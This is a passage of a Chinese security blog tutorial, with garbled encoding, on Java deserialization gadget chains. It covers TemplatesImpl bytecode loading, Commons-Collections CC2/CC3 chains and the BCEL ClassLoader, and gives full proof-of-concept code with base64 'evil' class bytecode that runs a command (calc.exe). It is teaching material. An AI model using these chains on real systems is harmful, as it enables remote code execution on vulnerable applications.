class="string">&quot;_bytecodes&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">&quot;_transletIndex&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">&quot;_outputProperties&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">&quot;_indentNumber&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><ul><li>åœ¨TemplatesImplçš„readObjectåºåˆ—åŒ–ä¸­å¯ä»¥çœ‹åˆ°<code>_name,_bytecodes,_class,_transletIndex,_outputProperties,_indentNumer,_tfactory</code>éƒ½éœ€è¦è®¾ç½®å€¼è¿›è¡Œåˆå§‹åŒ–ï¼Œä½†æ˜¯æœ‰äº›ä¸å½±å“åç»­åˆ©ç”¨çš„ä¸ç”¨ç®¡ï¼Œåªç”¨è®¾ç½®<code>_name</code>ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œ<code>_bytecode</code>ä¸ºæ¶æ„å­—èŠ‚ç æ•°ç»„ï¼Œ<code>_tfactory.get</code>ä¸ºTransformerFactoryImplå¯¹è±¡ã€‚</li></ul><p>ç”±äºæ˜¯ç§æœ‰å±æ€§ï¼Œéœ€è¦ç”¨åˆ°åå°„<code>obj.getClass().getDeclaredField()</code>ä¿®æ”¹å±æ€§å€¼</p><ul><li>è¯¥TemplatesImplåŠ è½½çš„å­—èŠ‚ç å¿…é¡»ä¸ºAbstractTransletå­ç±»ï¼Œå› ä¸ºdefineTransletClassesé‡Œä¼šå¯¹ä¼ å…¥ç±»è¿›è¡Œä¸€æ¬¡åˆ¤æ–­</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">  _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if this is the main class</span></span><br><span class="line">  <span class="comment">// ABSTRACT_TRANSLETæŒ‡com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletç±»</span></span><br><span class="line">  <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">      _transletIndex = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šç±»,ç”¨æ¥å¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨extendsç»§æ‰¿AbstractTransletç±»å¯ä»¥ç”¨superæ˜¾å¼è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ï¼Œsuper()å³æ˜¯æŒ‡å®šæ— å‚æ„é€ å‡½æ•°ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129212417331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129212417331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130131858524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130131858524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œæ•´POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°srcå­—èŠ‚ç æ¥è‡ªEvilTemplatesImpl.javaç¼–è¯‘çš„classï¼Œç„¶åå°†å†…å®¹base64ã€‚</p><p>è¿™é‡Œjdkçš„ç‰ˆæœ¬ä¸º8u65+commons-collections4.0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130132739469.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130132739469.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="TransformedMapè°ƒç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#TransformedMapè°ƒç”¨TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="TransformedMapè°ƒç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "></a>TransformedMapè°ƒç”¨TemplatesImplåŠ è½½å­—èŠ‚ç </h2><blockquote><p>ä¾èµ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;  </span><br></pre></td></tr></table></figure></blockquote><ul><li>CC1æ˜¯ä¾é TransformedMapç›´æ¥æ‰§è¡ŒRuntimeå®ä¾‹çš„execï¼Œé‚£æ ¹æ®ä»¥ä¸Šå†…å®¹ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒTemplatesImplä¸‹çš„newTransformerã€‚</li></ul><p>åªéœ€è¦ä¿®æ”¹ConstantTransformerçš„å¯¹è±¡ä¸ºTemplatesImplã€‚InvokerTransforomeræ‰§è¡Œçš„æ–¹æ³•ä¸ºnewTransformerï¼Œç”±äºnewTransformerä¸éœ€è¦å‚æ•°ï¼Œæ‰€ä»¥å‚æ•°åˆ—è¡¨å’Œå‚æ•°å†…å®¹nullå°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;godown&quot;</span>, <span class="string">&quot;buruheshen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130152023647.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130152023647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Common-collections3"><a href="#Common-collections3" class="headerlink" title="Common-collections3"></a>Common-collections3</h2><p>ä¸€èˆ¬æ¥è¯´éƒ½ä¸ç”¨InvokerTransformersï¼Œå› ä¸ºä¸€ä¸ªå¹¿æ³›ç”¨äºjavaååºåˆ—åŒ–è¿‡æ»¤çš„å·¥å…·SerialKillerï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬è¿‡æ»¤æ‰äº†InvokerTransformerï¼Œæ‰€ä»¥æœ‰äº†CC3</p><ul><li>CC3ä½¿ç”¨<code> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>ï¼Œè€Œä¸”è¿™ä¸ªç±»ä¸æ˜¯åƒInvokerTransformerä¸€æ ·è°ƒç”¨æ–¹æ³•ï¼Œè€Œæ˜¯ç›´æ¥åœ¨æ„é€ å‡½æ•°è°ƒç”¨äº†newTransformer()</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130192845333.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130192845333.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯ä¹‹å‰çš„CCé“¾è°ƒç”¨æ„é€ å‡½æ•°å¯ä»¥ä¾èµ–InvokerTransformerè°ƒç”¨transformè¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨ï¼ŒåŒ…æ‹¬æ„é€ å‡½æ•°ã€‚ï¼ˆgetConstructoråå°„æ²¡æœ‰transformæ¥å£ï¼Œå‰é¢æ— æ³•è¿èµ·æ¥)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130194653361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130194653361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥ç”¨InstantiateTransformeræ¥è°ƒç”¨TrAXFilteræ„é€ æ–¹æ³•ã€‚æ„é€ å‡½æ•°çš„å‚æ•°å°±æ˜¯å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130203928758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130203928758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h2><p>BCELåŒ…çš„<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>é‡å†™äº†javaå†…ç½®çš„<code>ClassLoader#loadClass()</code>æ–¹æ³•ã€‚BCELåŒ…çš„ClassLoaderä¼šåˆ¤æ–­ç±»åæ˜¯å¦ä¸º<code>$$BCEL$$</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯ï¼Œä¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼ˆç®—æ³•ç»†èŠ‚çœ‹æºç ï¼‰</p><p>å¯ä»¥é€šè¿‡BCELæä¾›çš„Repositoryå°†ä¸€ä¸ªclassè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼ˆä¹Ÿèƒ½ç›´æ¥ç¼–è¯‘ï¼‰ï¼Œå†ç”¨Utilityå°†åŸç”Ÿå­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼å­—èŠ‚ç </p><h3 id="BCELå¼¹è®¡ç®—å™¨"><a href="#BCELå¼¹è®¡ç®—å™¨" class="headerlink" title="BCELå¼¹è®¡ç®—å™¨"></a>BCELå¼¹è®¡ç®—å™¨</h3><p>å…ˆå†™ä¸€ä¸ªæ¶æ„ç±»BCELEvilï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELEvil</span> &#123;</span><br><span class="line">            <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) 